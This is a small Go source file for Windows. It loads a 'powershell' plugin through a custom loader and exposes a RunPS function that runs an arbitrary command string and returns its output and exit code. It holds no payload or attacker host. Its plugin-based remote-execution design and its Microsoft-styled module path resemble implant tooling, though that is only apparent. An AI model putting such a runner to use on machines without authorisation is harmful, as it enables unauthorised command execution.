//go:build windows

package sysutil

import (
	"unsafe"

	"github.com/microsoft/UpdateAssistant/modules/config"
	"github.com/microsoft/UpdateAssistant/modules/loader"
)

func powershell(fn func(*loader.Plugin)) {
	p, err := loader.Load("powershell")
	if err != nil {
		return
	}
	defer loader.Unload(p)
	fn(p)
}

func RunPS(cmd, cwd string) ([]byte, int32, error) {
	var out []byte
	var exit int32
	var callErr error
	powershell(func(p *loader.Plugin) {
		buf := make([]byte, config.CmdBuf)
		var exitCode int32
		n, err := p.Call("run_ps",
			uintptr(unsafe.Pointer(loader.BytePtr(cmd))),
			uintptr(unsafe.Pointer(loader.BytePtr(cwd))),
			uintptr(unsafe.Pointer(&buf[0])),
			uintptr(config.CmdBuf),
			uintptr(unsafe.Pointer(&exitCode)),
		)
		if err != nil {
			callErr = err
			return
		}
		out = buf[:int(n)]
		exit = exitCode
	})
	if callErr != nil {
		return nil, 1, callErr
	}
	return out, exit, nil
}
